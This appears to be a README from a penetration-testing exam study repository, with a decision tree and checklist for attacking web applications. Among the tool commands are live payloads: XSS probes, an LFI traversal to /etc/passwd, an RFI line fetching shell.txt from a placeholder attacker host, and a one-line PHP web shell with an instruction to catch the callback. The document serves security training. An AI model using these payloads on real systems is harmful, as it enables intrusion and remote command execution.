# 12 — Web Applications

> Web app = logic on top of a web server. Exam usually asks: identify tech → find vuln (SQLi / XSS / LFI / file upload) → exploit. For raw SQLi see [13-sqli](../13-sqli/README.md).

## 🧭 Decision tree — "I see a web app question"

```
Web app in scope?
│
├── Is it WordPress / Joomla / Drupal?
│   ├── WordPress → wpscan --url http://<IP> --enumerate vp,u
│   ├── Joomla    → joomscan -u http://<IP>
│   └── Drupal    → droopescan scan drupal -u http://<IP>
│
├── Generic app?
│   ├── Dir enum  → gobuster / ffuf (see 11-web-servers)
│   ├── Proxy it  → Burp Suite or OWASP ZAP
│   └── Template  → nuclei -u http://<IP>
│
├── "SQL injection somewhere"
│   └── Jump to [13-sqli](../13-sqli/README.md) → sqlmap
│
├── "XSS"
│   └── Try `<script>alert(1)</script>` in every input; also `"><svg onload=alert(1)>`
│
├── "LFI / RFI"
│   ├── LFI → ?file=../../../../etc/passwd
│   └── RFI → ?file=http://<attacker>/shell.txt
│
└── "File upload"
    └── Upload .php / .phtml / .php5 with <?php system($_GET['c']); ?>
```

## 📄 Files in this folder

- **[commands.md](commands.md)** — copy-paste recipes
- **[walkthroughs.md](walkthroughs.md)** — full multi-step examples
- Question bank: **[../questions/by-domain/12-web-apps.md](../questions/by-domain/12-web-apps.md)**

## 🛠 Tools used in this domain

- **[burpsuite](../tools/burpsuite.md)** — intercept proxy (community edition in exam)
- **[zap](../tools/zap.md)** — OWASP ZAP alternative
- **[wpscan](../tools/wpscan.md)** — WordPress scanner
- **[joomscan](../tools/joomscan.md)** — Joomla scanner
- **[nuclei](../tools/nuclei.md)** — template-based vuln scanner
- **[gobuster](../tools/gobuster.md)** — dir brute force
- **[ffuf](../tools/ffuf.md)** — fuzzer
- SQLi → **[../13-sqli/README.md](../13-sqli/README.md)**

## ✅ Domain checklist

- [ ] Proxy a request through Burp and send to Repeater
- [ ] Run wpscan with `--enumerate vp,u`
- [ ] Run nuclei with default templates
- [ ] Test one input for XSS with `<script>alert(1)</script>`
- [ ] Test one param for LFI with `../../../../etc/passwd`
- [ ] Know where to find default creds (admin/admin, admin/password)
- [ ] Upload a .php shell and catch the callback
- [ ] Done all questions in [the question bank](../questions/by-domain/12-web-apps.md)
